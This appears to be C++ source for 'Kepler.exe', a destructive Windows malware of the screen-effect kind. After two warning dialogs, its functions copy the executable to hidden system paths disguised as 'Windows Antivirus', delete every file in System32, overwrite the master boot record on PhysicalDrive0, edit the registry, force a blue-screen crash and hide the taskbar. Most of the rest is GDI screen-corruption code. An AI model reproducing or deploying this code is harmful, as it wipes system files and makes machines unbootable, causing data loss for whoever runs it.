#include "shaders.h"
using namespace Shaders;


namespace Payloads 
{
    const int HDCX = GetSystemMetrics(0), HDCY = GetSystemMetrics(1);

    bool WarnUser() {
        LPCSTR warning1 = "You have just executed Kepler.exe, a destructive malware that will harm your computer by deleting system files and overwriting the MBR (Master Boot Record). This was created for educational, testing, and entertainment purposes only. If you are not using a virtual machine, click \"No\" immediately and your system will be safe. Otherwise, if you understand the destructiveness of this malware, you may click \"Yes\" to run it. This is intended to be used on Windows XP, but it should work on any version of Windows.";
        LPCSTR warning2 = "This is the final warning. Clicking yes will run the malware and destroy your system. The creator is not responsible for any damage caused or if you choose to use this maliciously. Do you really want to do this?";
        if (MessageBoxA(NULL, warning1, "Kepler.exe", MB_ICONEXCLAMATION | MB_YESNO | MB_SYSTEMMODAL) == IDYES) {
            if (MessageBoxA(NULL, warning2, "After this, there is no turning back", MB_ICONEXCLAMATION | MB_YESNO | MB_SYSTEMMODAL) == IDYES) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    void Infect() {
        char selfpath[MAX_PATH];
        GetModuleFileNameA(NULL, selfpath, MAX_PATH);

        LPCSTR Dirs[] = {
            "C:\\Lol.exe",
            "C:\\hahaha.exe",
            "C:\\Windows\\trojan.exe", 
            "C:\\Windows\\Rip pc.exe", 
            "C:\\Windows\\System32\\die.exe",
            "C:\\Windows\\System32\\malsteve527.exe"
        };

        for (LPCSTR Dir : Dirs) {
            CopyFileA(selfpath, Dir, FALSE);
            SetFileAttributesA(Dir, FILE_ATTRIBUTE_HIDDEN);
        }

        CreateDirectoryA("C:\\Windows\\Windows Antivirus", NULL);
        SetFileAttributesA("C:\\Windows\\Windows Antivirus", FILE_ATTRIBUTE_HIDDEN);
        MoveFileA(selfpath, "C:\\Windows\\Windows Antivirus\\Antivirus.exe");
    }

    void DeleteFiles() {
        LPCSTR Local = "C:\\Windows\\System32\\*";
        WIN32_FIND_DATAA FileData;
        HANDLE hFind = FindFirstFileA(Local, &FileData);

        Local = "C:\\Windows\\System32\\";

        do {
            if (FileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) {
                CHAR FilePath[MAX_PATH];
                wsprintfA(FilePath, "%s%s", Local, FileData.cFileName);
                DeleteFileA(FilePath);
            }
        } while (FindNextFileA(hFind, &FileData));

        FindClose(hFind);
    }

    void OverwriteMBR() {
        DWORD bw;
        char data[512];
        HANDLE hMbr = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
        WriteFile(hMbr, data, 512, &bw, NULL);
        CloseHandle(hMbr);
    }

    void Regedit(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) {
        HKEY hKey;
        DWORD dwDisposition;
        LONG result;
        
        result = RegCreateKeyExW(
            HKey,
            Subkey,
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            KEY_ALL_ACCESS,
            NULL,
            &hKey,
            &dwDisposition
        );

        result = RegSetValueExW(
            hKey,
            ValueName,
            0,
            Type,
            (const unsigned char*)&Value,
            (int)sizeof(Value)
        );

        RegCloseKey(hKey);
    }

    void BSOD() { 
        BOOLEAN bl;
        ULONG rp;
        RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &rp);
    }

    void HideTaskbar() {
        HWND taskbar = FindWindowA("Shell_TrayWnd", NULL);
        ShowWindow(taskbar, SW_HIDE);
    }

    void TerminatePayload(HANDLE thread) {
        TerminateThread(thread, 0);
        CloseHandle(thread);
    }

    void ClearScreen() {
        InvalidateRect(0, 0, 0);
        Sleep(300);
    }

    DWORD WINAPI crazyMouse(LPVOID _) {
        POINT curPos;
        while (1) {
            GetCursorPos(&curPos);
            SetCursorPos(curPos.x + (rand() % 3) - 1, curPos.y + (rand() % 3) - 1);
        }
    }

    DWORD WINAPI circle(LPVOID _) {
        POINT tl, br;
        int size = (HDCX+HDCY)/22;
        int speed = 10;
        bool up = true, left = true;
        tl = {rand() % (HDCX-size), rand() % (HDCY-size)};

        while (1) {
            HDC hdc = GetDC(0);
            HBRUSH brush = CreateSolidBrush(Hue(3));
            SelectObject(hdc, brush);

            br = {tl.x + size, tl.y + size};

            Ellipse(hdc, tl.x, tl.y, br.x, br.y);

            up ? tl.y -= speed : tl.y += speed;
            left ? tl.x -= speed : tl.x += speed;

            if (tl.y <= 0) {
                up = false;
            } else if (br.y >= HDCY) {
                up = true;
            }

            if (tl.x <= 0) {
                left = false;
            } else if (br.x >= HDCX) {
                left = true;
            }

            ReleaseDC(0, hdc); DeleteObject(brush);

            Sleep(1);
        }
    }

    DWORD WINAPI square(LPVOID _) {
        POINT tl, br;
        int size = (HDCX+HDCY)/22;
        int speed = 10;
        bool left = true, up = true;
        tl = {rand() % (HDCX-size), rand() % (HDCY-size)};

        while (1) {
            HDC hdc = GetDC(0);
            HBRUSH brush = CreateSolidBrush(Hue(3));
            SelectObject(hdc, brush);

            br = {tl.x + size, tl.y + size};

            Rectangle(hdc, tl.x, tl.y, br.x, br.y);

            up ? tl.y -= speed : tl.y += speed;
            left ? tl.x -= speed : tl.x += speed;

            if (tl.y <= 0) {
                up = false;
            } else if (br.y >= HDCY) {
                up = true;
            }

            if (tl.x <= 0) {
                left = false;
            } else if (br.x >= HDCX) {
                left = true;
            }

            ReleaseDC(0, hdc); DeleteObject(brush);

            Sleep(1);
        }
    }

    DWORD WINAPI payload1(LPVOID _) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};

        int g = 0;
        int t = 0;
        int random = 0;

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX*HDCY; i++) {
                switch (random) {
                    case 0:
                        pixel[i].rgbRed -= i%HDCX ^ i/HDCX;
                        break;
                    case 1:
                        pixel[i].rgbGreen -= i%HDCX ^ i/HDCX;
                        break;
                    case 2:
                        pixel[i].rgbBlue -= i%HDCX ^ i/HDCX;
                        break;
                }
                pixel[i].rgb += i%HDCX | i/HDCX;
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            if (rand() % 5 == 0) BitBlt(hdc, 0, -1, HDCX, HDCX, hdc, 0, 0, SRCINVERT);

            if (g < 80) {
                g++;
            } else {
                BitBlt(hdc, 5*sin(t*1.5), -(5*cos(t*1.55)), HDCX, HDCY, hdc, 0, 0, SRCCOPY); t++;
                if (rand() % 16 == 0) {
                    InvalidateRect(0, 0, 0);
                    random = rand() % 3;
                    Sleep(5);
                }
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }
    
    DWORD WINAPI payload2(LPVOID _) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};
        BLENDFUNCTION blendFunc = {0, 0, 65, 0};
        
        int q = 0;
        
        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX*HDCY; i++) {
                pixel[i].rgb -= 500;
                pixel[i].rgbBlue = i%HDCX ^ i/HDCY + q;
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY); q-=5;

            AlphaBlend(hdc, (rand() % 3) - 1, (rand() % 3) - 1, HDCX, HDCY, memdc, 0, 0, HDCX, HDCY, blendFunc);
            
            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib); 
        }
    }

    DWORD WINAPI payload3(LPVOID _) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        DWORD rops[] = {SRCPAINT, SRCAND, NOTSRCERASE, NOTSRCCOPY};

        PRGBQUAD pixel = {0};
        
        int t = 0;
        
        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX*HDCY; i++) {
                pixel[i].rgb -= i%HDCX - i/HDCX;
                pixel[i].rgbGreen += 200;
                pixel[i].rgbRed = i;
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);
            
            int random = rand() % 4;
            int x = (rand() % 11) - 5, y = (rand() % 11)- 5;

            BitBlt(hdc, x, y, HDCX, HDCY, hdc, 0, 0, rops[random]);

            if (rand() % 16 == 0) {
                InvalidateRect(0, 0, 0);
                Sleep(5);
            }
            
            BitBlt(hdc, 4*sin(t*1.5), -(4*cos(t*1.55)), HDCX, HDCY, hdc, 0, 0, SRCCOPY); t++;

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib); 
        }
    }

    DWORD WINAPI payload4(LPVOID _) {
        BITMAPINFO bInfo = {0};
        bInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bInfo.bmiHeader.biWidth = HDCX;
        bInfo.bmiHeader.biHeight = HDCY;
        bInfo.bmiHeader.biBitCount = 32;
        bInfo.bmiHeader.biCompression = BI_RGB;
        bInfo.bmiHeader.biPlanes = 1;

        RGBQUAD *pixel = {0};
        HSL hslPixel;

        int q = 0;

        POINT lpoints[3];
        lpoints[0] = {40, -60};
        lpoints[1] = {HDCX, 60};
        lpoints[2] = {-40, HDCY-60};

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bInfo, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int w = 0; w < HDCX; w++) {
                for (int h = 0; h < HDCY; h++) {
                    int i = h * HDCX + w;

                    FLOAT shade = i%HDCX | (w+h)/HDCX + q;

                    hslPixel = rgb2hsl(pixel[i]);
                    hslPixel.h = fmod(shade / 300.f + h / HDCY * .1f, 1.f);
                    
                    pixel[i] = hsl2rgb(hslPixel);
                    pixel[i].rgbRed += 50;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY); q++;

            if (rand() % 4 == 0) {
                for (int i = 0; i <= 4; i++) {
                    StretchBlt(hdc, 50, 50, HDCX-100, HDCY-100, hdc, 0, 0, HDCX, HDCY, SRCCOPY);
                }
                PlgBlt(hdc, lpoints, hdc, 0, 0, HDCX, HDCY, 0, 0, 0);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload5(LPVOID _) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};

        int random = 0, t = 0;
        
        POINT lpoints[3];
        lpoints[0] = {40, -60};
        lpoints[1] = {HDCX, 60};
        lpoints[2] = {-40, HDCY-60};

        POINT rlpoints[3];
        rlpoints[0] = {-40, 60};
        rlpoints[1] = {HDCX, -60};
        rlpoints[2] = {40, HDCY+60};

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX*HDCY; i++) {
                pixel[i].rgbBlue += pixel[i].rgbRed;
                random == 0 ? pixel[i].rgb += i%HDCX ^ i/HDCX : pixel[i].rgbRed += pixel[i].rgbGreen;
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 8*sin(t*1.5), -(8*cos(t*1.55)), HDCX, HDCY, hdc, 0, 0, SRCCOPY); t++;

            if (rand() % 3 == 0) {
                switch (random) {
                    case 0:
                        PlgBlt(hdc, lpoints, hdc, 0, 0, HDCX, HDCY, 0, 0, 0);
                        PlgBlt(hdc, lpoints, hdc, 0, 0, HDCX, HDCY, 0, 0, 0);
                        break;
                    case 1:
                        PlgBlt(hdc, rlpoints, hdc, 0, 0, HDCX, HDCY, 0, 0, 0);
                        PlgBlt(hdc, rlpoints, hdc, 0, 0, HDCX, HDCY, 0, 0, 0);
                        break;
                }
                HBRUSH brush = CreateSolidBrush(Hue(2));
                SelectObject(hdc, brush);
                BitBlt(hdc, (rand() % 3) - 1, (rand() % 3) - 1, HDCX, HDCY, hdc, 0, 0, PATPAINT);
                DeleteObject(brush);
            }

            if (rand() % 13 == 0) {
                InvalidateRect(0, 0, 0);
                random = rand() % 2;
                Sleep(5);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload6(LPVOID _) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;
        
        RGBQUAD *pixel = {0};
        HSL hslPixel;

        FLOAT shade = 0;

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int w = 0; w < HDCX; w++) {
                for (int h = 0; h < HDCY; h++) {
                    int i = h * HDCX + w;

                    hslPixel = rgb2hsl(pixel[i]);
                    hslPixel.h = fmod(shade / 300.f + h / HDCY * .1f, 1.f);
                    pixel[i] = hsl2rgb(hslPixel);
                    pixel[i].rgbGreen += i/HDCX | i%HDCY;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 0, HDCY-50, HDCX, HDCY, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, 0, -50, HDCX, HDCY, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, -HDCX+30, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, 30, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            shade < 360 ? shade+=5 : shade = 0;

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload7(LPVOID _) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};

        int t = 0;
        int shift = 2;

        DWORD rops[] = {SRCPAINT, SRCERASE, NOTSRCERASE, SRCINVERT};
        DWORD theRop = rops[rand() % 4];

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX * HDCY; i++) {
                pixel[i].rgb += Hue(shift);
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 4*sin(t*1.4), -(4*cos(t*1.45)), HDCX, HDCY, hdc, 0, 0, SRCCOPY); t++;
            DrawIcon(hdc, rand() % HDCX, rand() % HDCY, LoadIcon(NULL, IDI_EXCLAMATION));
            
            if (rand() % 13 == 0) {
                BitBlt(hdc, (rand() % 11) - 5, (rand() % 11) - 5, HDCX, HDCY, hdc, 0, 0, theRop);
            }
            
            if (rand() % 21 == 0) {
                InvalidateRect(0, 0, 0);
                theRop = rops[rand() % 4];
                shift = (rand() % 2) + 1;
                Sleep(5);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload8(LPVOID _) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        RGBQUAD *pixel = {0};
        HSL hslPixel;

        int q = 0;

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int w = 0; w < HDCX; w++) {
                for (int h = 0; h < HDCY; h++) {
                    int i = h * HDCX + w;

                    FLOAT shade = i%HDCX + q ^ i/HDCX;

                    hslPixel = rgb2hsl(pixel[i]);
                    hslPixel.h = fmod(shade / 300.f + h / HDCY * .1f, 1.f);
                    
                    pixel[i] = hsl2rgb(hslPixel);
                    pixel[i].rgbBlue += i%HDCX + i/HDCX;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY); q += 5;

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload9(LPVOID _) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};

        HICON icons[] = {LoadIcon(NULL, IDI_ERROR), LoadIcon(NULL, IDI_EXCLAMATION), LoadIcon(NULL, IDI_INFORMATION)};
        
        POINT lpoints[3];
        lpoints[0] = {40, -60};
        lpoints[1] = {HDCX, 60};
        lpoints[2] = {-40, HDCY-60};

        DWORD rops[] = {SRCPAINT, SRCAND, NOTSRCERASE, NOTSRCCOPY};

        int random = 0, t = 0;

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX * HDCY; i++) {
                switch (random) {
                    case 0:
                        pixel[i].rgb += Hue(2);
                        break;
                    case 1:
                        pixel[i].rgbGreen += pixel[i].rgbRed;
                        break;
                    case 2:
                        pixel[i].rgb += 400;
                        break;
                    case 3:
                        pixel[i].rgbRed += pixel[i].rgb;
                        break;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 8*sin(t*1.6), -(8*cos(t*1.65)), HDCX, HDCY, hdc, 0, 0, SRCCOPY); t++;
            DrawIcon(hdc, rand() % HDCX, rand() % HDCY, icons[rand() % 3]);

            if (rand() % 17 == 0) {
                PlgBlt(hdc, lpoints, hdc, 0, 0, HDCX, HDCY, 0, 0, 0);
                PlgBlt(hdc, lpoints, hdc, 0, 0, HDCX, HDCY, 0, 0, 0);
                BitBlt(hdc, (rand() % 11) - 5, (rand() % 11) - 5, HDCX, HDCY, hdc, 0, 0, rops[rand() % 4]);
            }

            if (rand() % 16 == 0) {
                random = rand() % 4;
                InvalidateRect(0, 0, 0);
                Sleep(5);
                HBRUSH brush = CreateSolidBrush(Hue(1));
                SelectObject(hdc, brush);
                BitBlt(hdc, 0, 0, HDCX, HDCY, hdc, 0, 0, MERGECOPY);
                DeleteObject(brush);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }
}